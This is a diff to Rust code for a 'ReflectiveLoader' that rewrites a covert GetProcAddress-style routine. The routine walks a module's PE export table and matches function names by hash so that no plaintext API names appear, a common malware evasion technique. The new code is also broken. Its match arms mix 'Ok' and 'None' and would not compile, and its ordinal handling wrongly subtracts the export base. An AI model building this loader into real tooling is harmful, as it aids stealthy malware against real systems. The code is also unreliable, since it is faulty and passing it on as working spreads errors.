@@ -501,51 +501,41 @@ impl ReflectiveLoader {
 
     #[inline(always)]
     pub unsafe fn covert_get_proc_address(module_base: u64, target_hash: u32) -> Option<u64> {
-        let dos_header = module_base as *const u8;
-        let e_lfanew = (*dos_header.add(0x3C) as u32)
-            | (*dos_header.add(0x3D) as u32) << 8
-            | (*dos_header.add(0x3E) as u32) << 16
-            | (*dos_header.add(0x3F) as u32) << 24;
+        let export_dir_rva = match Self::_get_export_dir_rva(module_base) {
+            Ok(rva) => rva,
+            None => return None,
+        };
 
-        if e_lfanew == 0 {
-            return None;
-        }
+        let num_names = match Self::_get_num_names(module_base, export_dir_rva) {
+            Ok(n) => n,
+            None => return None,
+        };
 
-        let nt_headers = (module_base + e_lfanew as u64) as *const u8;
-        if *nt_headers.add(0) != b'P' || *nt_headers.add(1) != b'E' {
-            return None;
-        }
+        let names_rva = match Self::_get_names_rva(module_base, export_dir_rva) {
+            Ok(rva) => rva,
+            None => return None,
+        };
 
-        // IMAGE_DIRECTORY_ENTRY_EXPORT is index 0
-        let export_dir_rva = (*nt_headers.add(0x78) as u32)
-            | (*nt_headers.add(0x79) as u32) << 8
-            | (*nt_headers.add(0x7A) as u32) << 16
-            | (*nt_headers.add(0x7B) as u32) << 24;
-
-        if export_dir_rva == 0 {
-            return None;
-        }
+        let ordinals_rva = match Self::_get_ordinals_rva(module_base, export_dir_rva) {
+            Ok(rva) => rva,
+            None => return None,
+        };
 
         let export_dir = (module_base + export_dir_rva as u64) as *const u8;
-        let num_names = (*export_dir.add(0x18) as u32)
-            | (*export_dir.add(0x19) as u32) << 8
-            | (*export_dir.add(0x1A) as u32) << 16
-            | (*export_dir.add(0x1B) as u32) << 24;
+        let num_funcs = (*export_dir.add(0x14) as u32)
+            | (*export_dir.add(0x15) as u32) << 8
+            | (*export_dir.add(0x16) as u32) << 16
+            | (*export_dir.add(0x17) as u32) << 24;
 
-        let names_rva = (*export_dir.add(0x20) as u32)
-            | (*export_dir.add(0x21) as u32) << 8
-            | (*export_dir.add(0x22) as u32) << 16
-            | (*export_dir.add(0x23) as u32) << 24;
-
-        let ordinals_rva = (*export_dir.add(0x24) as u32)
-            | (*export_dir.add(0x25) as u32) << 8
-            | (*export_dir.add(0x26) as u32) << 16
-            | (*export_dir.add(0x27) as u32) << 24;
-
-        let funcs_rva = (*export_dir.add(0x10) as u32)
+        let base = (*export_dir.add(0x10) as u32)
             | (*export_dir.add(0x11) as u32) << 8
             | (*export_dir.add(0x12) as u32) << 16
             | (*export_dir.add(0x13) as u32) << 24;
+
+        let funcs_rva = (*export_dir.add(0x1C) as u32)
+            | (*export_dir.add(0x1D) as u32) << 8
+            | (*export_dir.add(0x1E) as u32) << 16
+            | (*export_dir.add(0x1F) as u32) << 24;
 
         let names_ptr = (module_base + names_rva as u64) as *const u32;
         let ordinals_ptr = (module_base + ordinals_rva as u64) as *const u16;
@@ -553,6 +543,10 @@ impl ReflectiveLoader {
 
         for i in 0..num_names {
             let name_rva = *names_ptr.add(i as usize);
+            if name_rva == 0 {
+                continue;
+            }
+
             let name_ptr = (module_base + name_rva as u64) as *const u8;
 
             let mut len = 0;
@@ -565,7 +559,11 @@ impl ReflectiveLoader {
             // Hash-based comparison - no plaintext strings!
             if Self::dbg2_hash_bytes(name_slice) == target_hash {
                 let ordinal = *ordinals_ptr.add(i as usize);
-                let func_rva = *funcs_ptr.add(ordinal as usize);
+                let ord = ordinal as u32;
+                if num_funcs == 0 || ord < base || ord - base >= num_funcs {
+                    continue;
+                }
+                let func_rva = *funcs_ptr.add((ord - base) as usize);
                 return Some(module_base + func_rva as u64);
             }
         }
